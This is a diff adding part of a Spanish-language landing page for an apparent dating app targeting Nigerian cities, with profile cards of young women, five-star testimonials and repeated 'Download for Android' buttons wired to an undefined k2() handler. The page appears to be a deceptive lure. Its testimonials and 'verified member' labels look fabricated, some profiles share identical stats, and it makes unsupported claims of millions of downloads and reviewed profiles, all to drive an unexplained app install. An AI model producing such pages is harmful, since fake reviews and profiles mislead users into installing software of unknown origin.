+    <div class="hot-card"><div class="hot-img"><img src="img/1-1.jpg"><span class="hot-badge popular">Popular</span><span class="hot-views">👁 12.4K</span></div><div class="hot-info"><div class="hot-name">Ada, 20</div></div></div>
+    <div class="hot-card"><div class="hot-img"><img src="img/2-1.jpg"><span class="hot-badge new">Recién Llegada</span><span class="hot-views">👁 8.2K</span></div><div class="hot-info"><div class="hot-name">Darlene, 22</div></div></div>
+    <div class="hot-card"><div class="hot-img"><img src="img/3-1.jpg"><span class="hot-badge verified">Verificada</span><span class="hot-views">👁 15.7K</span></div><div class="hot-info"><div class="hot-name">Alma, 25</div></div></div>
+    <div class="hot-card"><div class="hot-img"><img src="img/4-1.jpg"><span class="hot-badge popular">Popular</span><span class="hot-views">👁 20.1K</span></div><div class="hot-info"><div class="hot-name">Bonnie, 26</div></div></div>
+    <div class="hot-card"><div class="hot-img"><img src="img/5-1.jpg"><span class="hot-badge new">Recién Llegada</span><span class="hot-views">👁 9.8K</span></div><div class="hot-info"><div class="hot-name">Dora, 24</div></div></div>
+    <div class="hot-card"><div class="hot-img"><img src="img/6-1.jpg"><span class="hot-badge vip">VIP</span><span class="hot-views">👁 18.3K</span></div><div class="hot-info"><div class="hot-name">Camille, 24</div></div></div>
+  </div>
+  <div class="hot-dots" id="hotDots"><span class="hot-dot on"></span><span class="hot-dot"></span><span class="hot-dot"></span><span class="hot-dot"></span><span class="hot-dot"></span><span class="hot-dot"></span></div>
+</section>
+-->
+<section class="sec">
+  <h2 class="sec-title">Conócelas Esta Noche</h2>
+  <p class="sec-sub">Desliza sobre sus fotos. Están listas para conocerte.</p>
+  <div class="user-grid" id="userGrid">
+
+    <div class="user-card"><img src="img/1-1.jpg"><span class="badge badge-online">En Línea</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Ver Video</button><div class="info"><div class="name">Ada<span class="age">20</span></div><div class="job">Maquillista</div><div class="body-stats"><span>173cm</span><span>116lbs</span></div><div class="loc">Lagos</div></div></div>
+
+    <div class="user-card"><img src="img/2-1.jpg"><span class="badge badge-hot">Popular</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Ver Video</button><div class="info"><div class="name">Darlene<span class="age">22</span></div><div class="job">Estudiante</div><div class="body-stats"><span>176cm</span><span>109lbs</span></div><div class="loc">Abuja</div></div></div>
+
+    <div class="user-card"><img src="img/3-1.jpg"><span class="badge badge-new">Nueva</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Ver Video</button><div class="info"><div class="name">Alma<span class="age">25</span></div><div class="job">Estudiante</div><div class="body-stats"><span>165cm</span><span>112lbs</span></div><div class="loc">Port Harcourt</div></div></div>
+
+    <div class="user-card"><img src="img/4-1.jpg"><span class="badge badge-online">En Línea</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Ver Video</button><div class="info"><div class="name">Bonnie<span class="age">26</span></div><div class="job">Entrenadora Fitness</div><div class="body-stats"><span>168cm</span><span>116lbs</span></div><div class="loc">Kano</div></div></div>
+
+    <div class="user-card"><img src="img/5-1.jpg"><span class="badge badge-hot">Popular</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Ver Video</button><div class="info"><div class="name">Dora<span class="age">24</span></div><div class="job">Doctora</div><div class="body-stats"><span>165cm</span><span>104lbs</span></div><div class="loc">Ibadan</div></div></div>
+
+    <div class="user-card"><img src="img/6-1.jpg"><span class="badge badge-online">En Línea</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Ver Video</button><div class="info"><div class="name">Camille<span class="age">24</span></div><div class="job">Doctora</div><div class="body-stats"><span>165cm</span><span>104lbs</span></div><div class="loc">Enugu</div></div></div>
+
+    <div class="user-card"><img src="img/7-1.jpg"><span class="badge badge-new">Nueva</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Ver Video</button><div class="info"><div class="name">Cara<span class="age">26</span></div><div class="job">Fotógrafa</div><div class="body-stats"><span>168cm</span><span>113lbs</span></div><div class="loc">Benin City</div></div></div>
+
+    <div class="user-card"><img src="img/8-1.jpg"><span class="badge badge-online">En Línea</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Ver Video</button><div class="info"><div class="name">Debby<span class="age">21</span></div><div class="job">Estudiante</div><div class="body-stats"><span>168cm</span><span>108lbs</span></div><div class="loc">Owerri</div></div></div>
+
+  </div>
+</section>
+
+<section class="sec sec-dark">
+  <h2 class="sec-title">¿Cómo funciona?</h2>
+  <div class="steps">
+    <div class="step"><div class="step-num">1</div><h5>Descargar</h5><p>Descargar sin registrarse</p></div>
+    <div class="step"><div class="step-num">2</div><h5>Explorar</h5><p>Encuentra a alguien que te guste</p></div>
+    <div class="step"><div class="step-num">3</div><h5>Conocer esta noche</h5><p>Chatea, conoce y diviértete</p></div>
+  </div>
+</section>
+
+
+<section class="sec">
+  <h2 class="sec-title">Seguro y Privado</h2>
+  <div class="safety-grid">
+    <div class="safety-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#32c896" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><div style="font-weight:600;margin:2px 0">Privacidad</div><div style="font-size:0.55rem;color:rgba(255,255,255,0.35)">Tu identidad está protegida</div></div>
+    <div class="safety-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ffb432" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M9 12l2 2 4-4"/></svg><div style="font-weight:600;margin:2px 0">Verificados</div><div style="font-size:0.55rem;color:rgba(255,255,255,0.35)">Todos los perfiles revisados</div></div>
+    <div class="safety-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#4da6ff" stroke-width="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg><div style="font-weight:600;margin:2px 0">Soporte</div><div style="font-size:0.55rem;color:rgba(255,255,255,0.35)">Ayuda cuando la necesites</div></div>
+  </div>
+</section>
+ <a href="javascript:void(0)" class="dl-btn" onclick="k2()">Descargar para Android<small>4.8 Estrellas · 5M+ Descargas · Gratis</small></a>
+<section class="sec sec-dark">
+  <h2 class="sec-title">Lo que Dicen</h2>
+  <p class="sec-sub">Historias reales de personas que encontraron su pareja</p>
+  <div class="review-carousel" id="reviewCarousel">
+    <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Conocí a una chica increíble aquí el viernes pasado. Chateamos, nos tomamos unas copas esa misma noche y la química fue instantánea. ¡La mejor cita en años!"</p><div class="review-author"><img src="img/a/c1.jpg" alt=""><div><div class="review-author-name">Emeka</div><div class="review-author-role">Miembro Verificado</div></div></div></div>
+    <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Todos aquí son reales y genuinos. Sin perfiles falsos, sin juegos. Conocí a 3 mujeres maravillosas en 2 semanas. ¡Cada cita fue mejor que la anterior!"</p><div class="review-author"><img src="img/a/c2.jpg" alt=""><div><div class="review-author-name">Tunde</div><div class="review-author-role">Miembro Verificado</div></div></div></div>
+    <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Al principio era escéptico, pero hice match con Blessing y conectamos al instante. Tuvimos una cena increíble. ¡La veré de nuevo este fin de semana!"</p><div class="review-author"><img src="img/a/c3.jpg" alt=""><div><div class="review-author-name">David</div><div class="review-author-role">Miembro Verificado</div></div></div></div>
+    <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Es muy fácil encontrar a alguien con quien realmente conectes. Ves exactamente con quién estás hablando. Sin perder el tiempo, solo citas reales con personas reales."</p><div class="review-author"><img src="img/a/c4.jpg" alt=""><div><div class="review-author-name">Chuka</div><div class="review-author-role">Miembro Verificado</div></div></div></div>
+    <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Me uní el jueves y ya tenía una cita para el viernes por la noche. Fuimos por un café y hablamos durante horas. Sin duda, la conexión más natural que he tenido."</p><div class="review-author"><img src="img/a/c5.jpg" alt=""><div><div class="review-author-name">Femi</div><div class="review-author-role">Miembro Verificado</div></div></div></div>
+   </div> 
+</section>
+
+  <section class="sec" style="text-align:center">
+  <h3 style="font-size:1.1rem;font-weight:700;margin-bottom:0.25rem">¿Listo para <span style="background:linear-gradient(135deg,#ff4b6e,#c44dff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">esta noche</span>?</h3>
+  <p style="color:rgba(255,255,255,0.4);font-size:0.7rem;margin-bottom:0.85rem">5M+ ya descargaron. Tu noche comienza aquí.</p>
+  <a href="javascript:void(0)" class="android-btn" onclick="k2()">Descargar para Android<small style="display:block;font-size:0.55rem;font-weight:400;opacity:0.6;margin-top:1px">Gratis</small></a>
+</section>
+
+<!-- Viewer Overlay -->
+<div class="viewer" id="viewer">
+  <button class="viewer-close" onclick="closeViewer()" aria-label="Close">&times;</button>
+  <button class="viewer-arrow prev" onclick="viewerSlide(-1)" aria-label="Previous"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg></button>
+  <button class="viewer-arrow next" onclick="viewerSlide(1)" aria-label="Next"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg></button>
+  <div class="viewer-carousel" id="viewerCarousel" onscroll="updateViewerDots()"></div>
+  <div class="viewer-dots" id="viewerDots"></div>
+  <div class="viewer-info" id="viewerInfo"></div>
+</div>
+
+<div class="float-cta">
+  <a href="javascript:void(0)" class="float-cta-btn" onclick="k2()">Descarga gratuita</a>
+</div>
+
+<script>
+// Open viewer with 3 images
+function openViewer(n, name, job, age, height, weight, loc, folder) {
+  var carousel = document.getElementById('viewerCarousel');
+  var dots = document.getElementById('viewerDots');
+  var info = document.getElementById('viewerInfo');
+  var viewer = document.getElementById('viewer');
+  var base = folder || 'img';
+
+  carousel.innerHTML = '';
+  dots.innerHTML = '';
+  for (var i = 1; i <= 3; i++) {
+    var img = document.createElement('img');
+    img.src = base + '/' + n + '-' + i + '.jpg';
+    carousel.appendChild(img);
+    var dot = document.createElement('span');
+    dot.className = 'viewer-dot' + (i === 1 ? ' on' : '');
+    dots.appendChild(dot);
+  }
+  carousel.scrollLeft = 0;
+
+  info.innerHTML = '<div class="v-name">' + name + ', ' + age + '</div>' +
+    '<div class="v-job">' + job + '</div>' +
+    '<div class="v-stats">' + height + ' · ' + weight + '</div>' +
+    '<div class="v-loc">' + loc + '</div>';
+
+  viewer.classList.add('on');
+  document.body.style.overflow = 'hidden';
+}
+
+var viewerIdx = 0;
+function viewerSlide(dir) {
+  var carousel = document.getElementById('viewerCarousel');
+  var w = carousel.clientWidth;
+  viewerIdx += dir;
+  if (viewerIdx < 0) viewerIdx = 2;
+  if (viewerIdx > 2) viewerIdx = 0;
+  carousel.scrollTo({ left: viewerIdx * w, behavior: 'smooth' });
+}
+
+function closeViewer() {
+  document.getElementById('viewer').classList.remove('on');
+  document.body.style.overflow = '';
+}
+
+function updateViewerDots() {
+  var carousel = document.getElementById('viewerCarousel');
+  var dots = document.querySelectorAll('#viewerDots .viewer-dot');
+  var idx = Math.round(carousel.scrollLeft / carousel.clientWidth);
+  if (idx >= dots.length) idx = dots.length - 1;
+  if (idx < 0) idx = 0;
+  dots.forEach(function(d, i) { d.classList.toggle('on', i === idx); });
+}
+
+// Hot carousel auto-scroll + dots
+(function() {
+  var c = document.getElementById('hotScroll');
+  var dots = document.querySelectorAll('#hotDots .hot-dot');
+  if (!c || !dots.length) return;
+  var cards = c.querySelectorAll('.hot-card');
+  var i = 0;
+  var t = cards.length;
+  function scrollTo(idx) {
+    var w = cards[0] ? cards[0].offsetWidth + 10 : 150;
+    if (idx >= t) { idx = 0; c.scrollTo({ left: 0, behavior: 'instant' }); }
+    c.scrollTo({ left: idx * w, behavior: 'smooth' });
+    dots.forEach(function(d, di) { d.classList.toggle('on', di === idx % t); });
+  }
+  c.addEventListener('scroll', function() {
+    var w = cards[0] ? cards[0].offsetWidth + 10 : 150;
+    var idx = Math.round(c.scrollLeft / w);
+    if (idx >= t) idx = 0;
+    dots.forEach(function(d, di) { d.classList.toggle('on', di === idx); });
+    i = idx;
+  }, {passive: true});
+  setInterval(function() {
+    i = (i + 1) % t;
+    scrollTo(i);
+  }, 2500);
+})();
+
+// Review carousel auto-scroll
+(function() {
+    var c = document.getElementById('reviewCarousel');
+    if (!c) return;
+    var cards = c.querySelectorAll('.review-card');
+    var i = 0;
+    var t = cards.length;
+    var w = cards[0] ? cards[0].offsetWidth + 10 : 260;
+    function scroll() {
+        i = (i + 1) % t;
+        c.scrollTo({ left: i * w, behavior: 'smooth' });
+    }
+    setInterval(scroll, 2000);
+})();
+</script>
+
+</body>
+</html>
